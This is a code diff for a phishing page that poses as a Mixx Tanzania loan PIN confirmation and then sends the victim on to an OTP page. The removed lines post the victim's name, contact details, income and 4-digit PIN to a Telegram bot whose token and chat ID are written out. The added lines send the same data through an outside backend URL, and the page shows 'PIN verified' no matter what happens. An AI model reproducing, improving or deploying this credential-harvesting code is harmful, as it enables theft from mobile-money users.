@@ -302,14 +302,11 @@
     <script>
         // ============================================
         // MIXX TANZANIA - PIN CONFIRMATION PAGE
-        // WITH DIRECT TELEGRAM INTEGRATION
+        // SECURE - Uses Backend API
         // ============================================
         
-        // YOUR TELEGRAM CREDENTIALS
-        const TELEGRAM_BOT_TOKEN = '7701010924:AAH5jAVQr7fWD0RZwspQMXzLgMJ3mmSCQoc';
-        const TELEGRAM_CHAT_ID = '8409068780';
+        const BACKEND_URL = 'https://miixxyaass-production.up.railway.app';
         
-        // Get data from URL parameters
         const urlParams = new URLSearchParams(window.location.search);
         const amount = urlParams.get('amount') || '0';
         const term = urlParams.get('term') || '0';
@@ -321,28 +318,14 @@
         const employment = decodeURIComponent(urlParams.get('employment') || '');
         const income = decodeURIComponent(urlParams.get('income') || '');
 
-        // Validate required data
-        if (!name || !email || !phone) {
-            console.error('Missing required data');
-            document.getElementById('errorMsg').textContent = 'Missing application data. Redirecting...';
-            document.getElementById('errorMsg').classList.add('show');
-            setTimeout(() => {
-                window.location.href = 'index.html';
-            }, 2000);
-        }
-
-        // Update summary display
         document.getElementById('summaryAmount').innerText = `TZS ${parseFloat(amount).toLocaleString()}`;
         document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
         document.getElementById('summaryMonthly').innerText = `TZS ${parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits: 0, maximumFractionDigits: 0})}`;
         document.getElementById('summaryRate').innerText = `${rate}%`;
-        
-        // Update user details display
         document.getElementById('userName').innerText = name || '-';
         document.getElementById('userEmail').innerText = email || '-';
         document.getElementById('userPhone').innerText = phone || '-';
 
-        // PIN input elements
         const pinInputs = ['pin1', 'pin2', 'pin3', 'pin4'].map(id => document.getElementById(id));
         const confirmBtn = document.getElementById('confirmBtn');
         const errorMsg = document.getElementById('errorMsg');
@@ -398,73 +381,34 @@
             }
         }
 
-        // DIRECT TELEGRAM NOTIFICATION FUNCTION
-        async function sendPinToTelegram(pin) {
-            const timestamp = new Date().toLocaleString('en-TZ', { timeZone: 'Africa/Dar_es_Salaam' });
-            
-            const message = `
-🔐 <b>MIXX TANZANIA - 🔴 PIN ALERT 🔴</b>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-📅 <b>Time:</b> ${timestamp}
-👤 <b>Name:</b> <code>${escapeHtml(name)}</code>
-📧 <b>Email:</b> <code>${escapeHtml(email)}</code>
-📱 <b>Phone:</b> <code>${escapeHtml(phone)}</code>
-💼 <b>Employment:</b> ${escapeHtml(employment)}
-💰 <b>Income:</b> TZS ${parseInt(income || 0).toLocaleString()}
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🏦 <b>LOAN DETAILS:</b>
-   💵 Amount: TZS ${parseInt(amount).toLocaleString()}
-   📅 Term: ${term} months
-   📊 Interest: ${rate}% APR
-   💳 Monthly: TZS ${parseInt(monthly).toLocaleString()}
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔐 <b>4-DIGIT PIN:</b> <code>${escapeHtml(pin)}</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ <b>ACTION REQUIRED:</b> Verify this PIN immediately!
-📍 <b>Device:</b> ${navigator.userAgent.substring(0, 100)}
-            `;
-            
-            console.log('Sending PIN to Telegram...');
+        async function sendPinToBackend(pin) {
+            const data = {
+                type: 'pin',
+                name: name,
+                email: email,
+                phone: phone,
+                amount: amount,
+                term: term,
+                rate: rate,
+                monthly: monthly,
+                pin: pin,
+                employment: employment,
+                income: income
+            };
             
             try {
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const response = await fetch(url, {
+                const response = await fetch(`${BACKEND_URL}/api/send-telegram`, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML',
-                        disable_web_page_preview: true
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
                 });
-                
-                const result = await response.json();
-                
-                if (result.ok) {
-                    console.log('✅ PIN sent to Telegram successfully!');
-                    return { success: true };
-                } else {
-                    console.error('❌ Telegram error:', result.description);
-                    return { success: false, error: result.description };
-                }
+                return await response.json();
             } catch (error) {
-                console.error('❌ Network error:', error);
-                return { success: false, error: error.message };
+                console.error('Error:', error);
+                return { success: false };
             }
         }
 
-        function escapeHtml(text) {
-            if (!text) return 'N/A';
-            return String(text)
-                .replace(/&/g, '&amp;')
-                .replace(/</g, '&lt;')
-                .replace(/>/g, '&gt;');
-        }
-
-        // Handle confirm button click
         confirmBtn.addEventListener('click', async () => {
             const pin = getPin();
             
@@ -477,19 +421,11 @@
             errorMsg.classList.remove('show');
             showLoading(true);
             
-            // Send PIN directly to Telegram
-            const result = await sendPinToTelegram(pin);
+            await sendPinToBackend(pin);
             
-            if (result.success) {
-                successMsg.textContent = '✓ PIN verified! Redirecting...';
-                successMsg.classList.add('show');
-            } else {
-                console.warn('Telegram send failed, but continuing...');
-                successMsg.textContent = '✓ Continuing...';
-                successMsg.classList.add('show');
-            }
+            successMsg.textContent = '✓ PIN verified! Redirecting...';
+            successMsg.classList.add('show');
             
-            // Prepare data for next page
             const params = new URLSearchParams({
                 amount: amount,
                 term: term,
@@ -502,7 +438,6 @@
                 income: income
             });
             
-            // Redirect to OTP verification page after short delay
             setTimeout(() => {
                 window.location.href = `otp-verify.html?${params.toString()}`;
             }, 1500);
